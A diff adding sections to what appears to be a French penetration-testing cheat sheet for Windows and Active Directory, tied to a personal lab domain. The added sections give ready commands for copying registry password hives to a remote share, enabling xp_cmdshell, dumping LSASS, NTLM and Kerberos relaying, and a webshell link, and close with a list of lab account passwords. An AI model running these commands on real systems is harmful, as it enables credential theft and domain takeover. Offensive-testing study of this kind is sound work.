@@ -6,6 +6,73 @@ date: '2024-01-10'
 
 **_On essaye d'apprendre des trucs ouuuuuuuuuuuuuuuuuuuu_**
 
+# Table des matières
+
+# Table des matières
+
+- [Table des matières](#table-des-matières)
+- [Table des matières](#table-des-matières-1)
+- [Installation de la caisse à outils](#installation-de-la-caisse-à-outils)
+  - [NXC](#nxc)
+    - [Usage:](#usage)
+  - [Impacket](#impacket)
+    - [Usage:](#usage-1)
+  - [Bloodhound](#bloodhound)
+    - [Usage:](#usage-2)
+  - [Evil-winrm](#evil-winrm)
+    - [Usage:](#usage-3)
+  - [Psencoder](#psencoder)
+  - [Compilation cross OS](#compilation-cross-os)
+    - [Package a installé (Chat GPT édition)](#package-a-installé-chat-gpt-édition)
+    - [Compilation d'un EXE](#compilation-dun-exe)
+    - [Compilation d'une DLL](#compilation-dune-dll)
+- [Windows](#windows)
+  - [Shares](#shares)
+    - [smbclient](#smbclient)
+    - [mount](#mount)
+    - [nxc](#nxc-1)
+    - [windows](#windows-1)
+  - [Services](#services)
+    - [windows](#windows-2)
+      - [En mode jolie](#en-mode-jolie)
+      - [Unquoted service](#unquoted-service)
+  - [Extraction de mot de passe](#extraction-de-mot-de-passe)
+    - [Windows](#windows-3)
+    - [Traitement](#traitement)
+  - [MSSQL](#mssql)
+    - [Windows](#windows-4)
+    - [Linux](#linux)
+    - [RCE](#rce)
+  - [IIS](#iis)
+    - [WebShell](#webshell)
+  - [Privilèges](#privilèges)
+    - [SeImpersonate](#seimpersonate)
+    - [Activation de tout les privilèges](#activation-de-tout-les-privilèges)
+    - [Changement d'utilisateur](#changement-dutilisateur)
+  - [Gestion des utilisateurs et groupes](#gestion-des-utilisateurs-et-groupes)
+- [Active Directory](#active-directory)
+  - [Enumération des partages sans mot de passes](#enumération-des-partages-sans-mot-de-passes)
+    - [Windows](#windows-5)
+    - [Linux](#linux-1)
+  - [Dump Ldap](#dump-ldap)
+    - [Linux](#linux-2)
+  - [Bloodhound](#bloodhound-1)
+    - [Windows](#windows-6)
+    - [Linux](#linux-3)
+  - [Dump Lsass](#dump-lsass)
+    - [Windows](#windows-7)
+    - [Linux](#linux-4)
+  - [Création d'un compte machine](#création-dun-compte-machine)
+    - [Linux](#linux-5)
+  - [Relais](#relais)
+    - [Linux](#linux-6)
+  - [KrbRelayUp](#krbrelayup)
+- [Lab](#lab)
+  - [**AD**](#ad)
+  - [Srv standelone](#srv-standelone)
+  - [plage](#plage)
+
+
 # Installation de la caisse à outils
 
 L'ensemble des outils requiert Python3. Si ce dernier n'est pas installé, vous devez le faire pour garantir un fonctionnement sans entraves.
@@ -125,6 +192,7 @@ sudo xbps-install -S mingw-w64-gcc mingw-w64-g++ mingw-w64-headers
 ```
 x86_64-w64-mingw32-gcc -o magie.exe magie.c   # 64 bits
 i686-w64-mingw32-gcc   -o magie.exe magie.c   # 32 bits
+touch ~/.klemou_was_here                      # 128 bits
 ```
 
 ```c
@@ -263,6 +331,56 @@ Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartM
 Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName,StartName
 ```
 
+## Extraction de mot de passe
+
+### Windows
+
+```powershell
+reg save HKLM\SAM "\\ip\SHARE\sam.save"
+reg save HKLM\SECURITY "\\ip\SHARE\security.save"
+reg save HKLM\SYSTEM "\\ip\SHARE\system.save"
+```
+
+### Traitement 
+
+```
+
+```
+
+## MSSQL
+
+### Windows
+
+Azure Data Studio
+
+### Linux
+
+```
+mssqlclient.py user:password@ip
+mssqlclient.py -windows-auth user:password@ip
+```
+
+### RCE
+
+```
+# This turns on advanced options and is needed to configure xp_cmdshell
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+#This enables xp_cmdshell
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+
+# Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
+```
+
+## IIS
+
+### WebShell
+
+cmd.aspx:
+-   https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
+
 ## Privilèges
 
 ### SeImpersonate
@@ -274,19 +392,141 @@ Explication et exploitation:
 
 https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
 
+### Changement d'utilisateur
 
+```powershell
+$username = "sql_user"
+$password = "ee3f628e3b.14501b0b8f"
+$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))
+Start-Process cmd.exe -WorkingDirectory C:\Windows\Temp -Credential ($credentials)
+```
+
+## Gestion des utilisateurs et groupes
+
+```
+net user # list les utilisateurs
+net user username password /add # ajout d'un utilisateur
+net user username /del # suppresion d'un utilisateur
+
+net localgroup # list des groupes
+net localgroup groupename user /add # ajout d'un utilisateur dans un groupe
+net localgroup groupename user /del # suppresion d'un utilisateur dans un groupe
+```
+
+# Active Directory
+
+##  Enumération des partages sans mot de passes
+
+### Windows
+
+```
+snaffler.exe -s -o snaffler.log
+```
+
+### Linux
+
+```
+nxc smb ip/24 -u "a" -p "" --shares
+```
+
+## Dump Ldap
+
+### Linux
+
+```
+ldapdomaindump -u 'DOMAIN\user' -p 'pass' dc01.domain.local
+```
+
+
+## Bloodhound
+
+### Windows
+
+```
+.\SharpHound.exe -c all
+```
+
+### Linux
+
+```
+rusthound --domain domain.local -u 'user' -p 'password'  -o output -z --fqdn-resolver --name-server dc.domain.local
+bloodhound-python -u user -p 'password' -ns 10.10.10.10 -d domain.local -c all
+```
+
+## Dump Lsass
+
+### Windows
+```
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+```
+
+### Linux
+```
+nxc smb mssql.klemou.corp -u crz -p '992e71f059.585a7ffa20' -M lsassy
+```
+
+## Création d'un compte machine
+
+
+
+### Linux
+
+```
+# Add a computer account
+addcomputer.py -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -domain-netbios $DOMAIN 'DOMAIN\user:password'
+
+# Modify a computer account password
+addcomputer.py -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host $DomainController -no-add 'DOMAIN\user:password'
+
+# Delete a computer account
+addcomputer.py -computer-name 'COMPUTER$' -dc-host $DomainController -delete 'DOMAIN\user:password'
+```
+
+## Relais
+
+### Linux
+
+```
+ntlmrelayx.py -t "ldaps://dc01.klemou.corp" -smb2support
+ntlmrelayx.py -t "ldap://dc01.klemou.corp" -smb2support --escalate-user domainuser
+```
+
+## KrbRelayUp
+
+```
+.\KrbRelayUp.exe relay -Domain klemou.corp -CreateNewComputerAccount -Computer evil$ -ComputerPassword evil123
+.\KrbRelayUp.exe spawn -m rbcd -d klemou.corp -dc DC02.klemou.corp -cn KRBRELAYUP$ -cp evil123
+```
 # Lab
 
 ## **AD**
 ```
 Administrator : fe63693e9e.2e90861a9c
 antoine       : 099bd3d1c39.c22d1a464
+crz           : 992e71f059.585a7ffa20
+glpi_cnx      : a9285936fb.3dfdf6a889
+ws_klemou     : Qwertyuiop123!
+sql_svc       : 515aa2db9.749107818e6
+hugo          : e0eec4062.cbc38dd8f38
+sql_mngt      : 5486a9646.1b307dcf720
+ndes          : f77c171f50.001b01ade5
+
+Local Adm     : 4eaf07215.645eb0e68f6
 ```
 
 ## Srv standelone
 ```
 klemou        : 634daa6f9.4519be0b91c  #CC978D063970FC60FD9DA830D160A229
-sa            : MssqlPasswordFTW123!
+sql_user      : ee3f628e3b.14501b0b8f
+sa            : MssqlPasswordFTW123!   # compte local a sql
+
+user1         : Esna123$
+.               .
+.               .
+.               .
+user30        : Esna123$
 ```
 ## plage
 
